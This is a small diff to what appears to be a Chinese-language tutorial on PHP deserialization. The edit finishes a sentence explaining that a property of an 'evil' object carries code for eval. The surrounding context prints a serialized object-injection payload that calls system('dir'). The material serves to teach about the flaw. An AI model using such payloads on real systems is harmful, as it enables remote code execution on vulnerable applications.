@@ -87,7 +87,7 @@ echo $b;
 ?>
 ```
 得到能够触发漏洞的$test
-此时的test赋值为evil的一个对象，并且属性test2赋值为
+此时的test赋值为evil的一个对象，并且属性test2赋值为eval里需要执行的代码
 ```php
 O:5:"index":1:{s:11:"indextest";O:4:"evil":1:{s:5:"test2";s:14:"system('dir');";}}
 
